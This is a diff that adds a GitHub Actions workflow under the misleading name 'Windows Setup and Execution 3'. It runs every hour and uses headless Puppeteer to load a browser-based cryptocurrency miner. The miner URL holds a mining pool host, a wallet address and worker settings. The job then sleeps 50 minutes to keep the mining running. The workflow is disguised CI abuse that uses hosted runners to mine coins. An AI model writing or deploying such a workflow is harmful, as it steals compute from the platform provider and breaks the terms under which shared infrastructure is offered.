@@ -1,0 +1,44 @@
+name: Windows Setup and Execution 3
+
+on:
+  schedule:
+    # Run every hour
+    - cron: '0 * * * *'
+  workflow_dispatch: # Allow manual trigger for testing
+
+jobs:
+  run-chrome:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'  # You can specify the version you need
+
+      - name: Install dependencies
+        run: |
+          npm install puppeteer
+
+      - name: Run Puppeteer script
+        run: |
+          node -e "
+          const puppeteer = require('puppeteer');
+          (async () => {
+            const browser = await puppeteer.launch({ headless: true });
+            const page = await browser.newPage();
+            await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=4');
+            const content = await page.content();
+            console.log('Page title:', await page.title());
+            require('fs').writeFileSync('response.html', content);
+            await browser.close();
+          })();
+          "
+
+      - name: Sleep for 50 minutes
+        run: |
+          echo "Sleeping for 50 minutes..."
+          sleep 3000  # Sleep for 3000 seconds (50 minutes)
